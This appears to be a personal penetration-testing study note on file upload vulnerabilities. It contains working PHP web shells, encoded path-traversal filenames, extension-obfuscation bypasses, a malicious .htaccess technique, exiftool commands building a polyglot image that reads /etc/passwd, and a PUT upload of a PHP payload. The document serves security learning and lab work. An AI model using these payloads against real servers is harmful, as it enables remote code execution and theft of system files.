![[File Uploads.webp]]
# File Uploads

Vulnerabilities arise when a server allows users to upload files without sufficiently validating things like name, type, contents or size meaning an image upload function can be used to upload dangerous files that enable remote code execution.

Sites are increasingly dynamic and the path of a request often has no direct relationship to the filesystem at all. However, servers can still deal with requests for some static files like CSS, images and so on. The server parses the path in the request to find the extension which determines the type of file being requested.

- If the file is not executable, the server just sends the file contents to the client in a response.
- If the file is executable and the server is configured to execute, it assigns variables based on headers and parameters in the request before running the script which may be output to the client browser.
- If the file is executable and the server is not configured to execute, it responds with an error, but may also serve the contents of the file as plain text.
# Recon

Identify any file upload functionalities on the app either direct or indirect accessible functions. Then, use the test cases here from the labs to identify vulnerabilities on the file upload process.

If you find a file upload functionality on an app, try out the following techniques. However, much more can be done depending on which part of the file the app is not validating, how the app is using the file (e.g. interpreters like XML parsers) and where the file is being stored.

In some cases, uploading the file is enough to cause damage. If the uploaded file is available within the webroot, try submitting HTML/JavaScript file, then view the file - it may introduce an easy XSS vulnerability.
# Unrestricted File Uploads

If you can upload a web shell, it can provide full control over the server - possible when the site allows uploading of server-side scripts like PHP, Java or Python files and is configured to execute them. 

An example malicious PHP one-liner file below could be used to read certain files on the system:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Sending a request for the malicious file will return the file contents in the response. A more advanced web shell may be the following, allowing the passing of system commands via query parameters (i.e. `command`):

```php
<?php echo system($_GET['command']); ?>
```

An even more advanced shell may be the [p0wnyshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php).

For example, there may be a profile picture upload option that allows the upload of PHP files. Uploading a PHP web shell such as p0wny and navigating to it may provide full command execution if no filters are in place:

![[p0wnyshell.png]]
# Flawed File Type Validation

Browsers typically send the provided data in a POST request with the content type of `application/x-www-form-urlencoded` when submitting HTML forms. It is not suitable for sending large amounts of binary data, such as an entire image file or a PDF which prefers `multipart/form-data` type.

If a form has fields for uploading images, a form submission may appear to be:

```http
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

Message body may be split into separate parts for each input. Each part contains a Content-Disposition header to provide basic information about the input field. The individual parts may also contain a Content-Type header to tell the server the MIME type of data submitted.

Some sites may validate uploads by checking that the input-specific Content-Type header matches an expected MIME type. If it expects images, it may only accept `image/jpeg` for example. If no further validation is done, it can be bypassed by manually changing the content type to an accepted MIME type.

For example, an app may block PHP files and only accept image types. If so, try intercepting the upload request and manually changing the MIME type to `image/jpeg` or `image/png`:

![[Content-Type JPEG.png]]
# Chaining Vulns - Path Traversal

Another defense is stopping the server from executing any scripts. Servers generally only run scripts whose MIME type they are configured to execute otherwise they may return an error or serve the contents of the file as plain text.

A directory which user-supplied files are uploaded likely has more strict controls than other locations. If there is a way to upload a script to a different directory, the server may execute the script after all.

>[!info]
>Servers often use the `filename` field in `multipart/form-data` to determine the name and location to store the file.

For example, an app may allow users to upload PHP files but the file cannot execute. If so, try introducing a path traversal attack to upload the file into a different directory by changing 

![[Filename.png]]

If still no luck, try encoding the path traversal sequence:

```bash
..%2fp0wny.php
%2e%2e%2fp0wny.php
%252e%252e%252fp0wny.php
```

![[Encoded.png]]

>[!info]
>If no luck, try navigating to other directories like where images are stored or a static folder where CSS and image files are stored.
# Insufficient Blacklisting

Another way to prevent malicious files is blacklisting any potential dangerous extensions like `.php`. However, it is difficult to block every possible file extension used to execute code. Blacklists could be bypassed by using lesser known, alternative extensions such as `.php5` or `.shtml`.

Servers won't typically execute files unless configured to do so. Devs may have to enable certain things like in Apache to allow this:

```php
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

Servers allow devs to create special config files within individual directories to override or add to one or more global settings. Apache will load a directory-specific configuration from a file called `.htaccess` if present.

Devs can also make directory-specific configs on IIS using `web.config` which may include directives like the following to allow JSON files to be served:

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```

Web servers use configs like this when present, but are not normally allowed to be accessed via HTTP requests. Some servers may fail to stop the uploading of your own config file. If so, try tricking the server into mapping an arbitrary custom file extension to an executable MIME type.

For example, an app may return an error disclosing the backend server type:

![[Apache Disclosed.png]]

If Apache is present, try uploading a malicious `.htaccess` file to make configuration changes for a certain directory by adding a MIME type such as:

![[HTAccess.png]]

>[!info]
>It states that any `.shell` files should be interpreted and executed as PHP code.

If successfully uploaded, the file is added to the specific directory. Try uploading a `.shell` malicious PHP file:

![[Shell Extension.png]]
# Obfuscated File Extensions

Some exhaustive blacklists can be bypassed using obfuscation techniques. For example, it may be case sensitive and fails to recognize `.pHp` as `.php`. If the code that maps the file extension to a MIME type is not case sensitive, you can sneak malicious PHP files past validation. Some other techniques include:

- Provide multiple extensions - depending on algorithm used to parse the filename, the following may be interpreted as a PHP or JPG image (`exploit.php.jpg`).
- Add trailing characters - some components will strip/ignore trailing whitespace, dots and such (`exploit.php.`).
- Try using URL encoding or double URL encoding for dots, forward slashes, and backward slashes. If values are not decoded when validating file extension, but later decoded server-side, you can upload files (`exploit%2e.php`).
- Add semicolons or URL encoded null byte characters before file extension. If validation is written in PHP or Java, but the server processes the file using lower-level functions in C/C++, it can cause discrepancies in what's treated as the end of the file (`exploit.asp;.jpg`) or (`exploit.asp%00.jpg`).
- Try using multibyte encoding characters which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before used in a path.

Other defenses may strip or replace dangerous extensions. If the transformation does not get applied recursively, try positioning the prohibited string in a way that removing it still leaves behind a valid file extension (e.g. `exploit.p.php.hp).

For example, try uploading a web shell - it may return stating only JPGs and PNGs are allowed. If so, try various things such as using a capital letter:

![[Capital.png]]

Or, try using multiple extensions:

![[PHP JPG.png]]

It may succeed but it may not be interpreted as a PHP script. Also try using URL and double URL encoding:

![[URL Encoded.png]]

If no success, try adding a null byte:

![[Null Byte.png]]

It may work as it bypasses the filters and when it gets saved, the null byte terminates there, removing anything afterwards.

# Flawed Validation

More secure servers may verify the contents of the file actually match what is expected. For example, the server may try to verify certain intrinsic properties of an image like dimensions. Certain file types may always contain a specific sequence of bytes in their header or footer.

They are used like a fingerprint to determine whether the contents match the expected type - JPEG files always begin with the bytes `FF D8 FF`. Using tools, you can create a polyglot JPEG file containing malicious code within its metadata.

For example, try using Exiftool to inspect a JPEG or PNG file:

>[!powershell]
>```powershell
>.\exiftool.exe ..\AstroKitty.png

![[Exiftool.png]]

It can reveal details about the file. A comment can be added to the metadata of the image:

>[!powershell]
>```powershell
>.\exiftool.exe -comment="pwned" ..\AstroKitty.png

![[Comment Pwned.png]]

Try modifying the comment with some PHP:

>[!powershell]
>```powershell
>.\exiftool.exe -comment="<?php echo 'PAYLOAD' . file_get_contents('/etc/passwd') . 'PAYLOAD2'; ?>" ..\AstroKitty.png

![[Comment PHP.png]]

Next, make it a polyglot by specifying an output file to create a new file with a different extension:

>[!powershell]
>```powershell
>.\exiftool.exe -comment="<?php echo 'PAYLOAD' . file_get_contents('/etc/passwd') . 'PAYLOAD2'; ?>" ..\AstroKitty.png -o polyglot.php

![[Polyglot.png]]

Try uploading the polyglot and navigating to it - the PHP code may be executed:

![[Payload Exec.png]]

Another way is to simply inject the malicious code after the beginning bytes of the file to bypass this validation. 

![[File Upload 3.png]]

![[File Upload 4.png]]
# File Upload Race Conditions

Modern frameworks are more hardened and don't generally allow uploaded files directly to their intended destination on the filesystem. They may take precautions like uploading to a temp, sandboxed directory and randomizing the name to avoid overwriting existing files.

They may then perform validation on the temporary file and only transfer it over once deemed safe. 

Devs sometimes implement their own processing of file uploads independently which is fairly complex and can introduce race conditions that allow a complete bypass of robust validation.

Some sites upload the file directly to the main filesystem and then remove it if it does not pass validation - typical on sites that rely on AV to check for malware. It may only take milliseconds, but an attacker can still execute it in that time.

Similiar race conditions can occur in functions allowing you to upload files by providing a URL. If so, the server fetches the file over the internet and creates a local copy before performing any validation. As the file loads using HTTP, devs are unable to use the framework mechanisms for securely validating files.

They may manually create their own processes for temporarily storing and validating the file. 

For example, if the file is loaded into a temp directory with a random name, it should be impossible to exploit any race conditions. If you don't know the directory name, you are unable to request the file in order to trigger it. However, if the random directory name is generated using pseudo-random functions like `uniqid()`, it can be brute forced.

Try extending the amount of time taken to process the file by uploading a larger file. If it gets processed in chunks, you may take advantage of it by creating a malicious file with the payload at the start followed by a large number of padded bytes.
# File Upload without Remote Code Execution

If script execution is not possible, you may be able to upload scripts for client side attacks. If you can upload HTML files or SVG images, you can use `<script>` tags to create stored XSS payloads. If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page.

>[!info]
>Due to same-origin policy restrictions, these attacks only work if the uploaded file is served from the same origin.

If the uploaded file seems to be stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. If you know the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, it may be a potential vector for XXE.
# Uploading Files via PUT

Some servers may be configured to use PUT requests. If defenses are not in place, it can provide alternative means of uploading malicious files, even when the upload function is not available via the web interface:

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

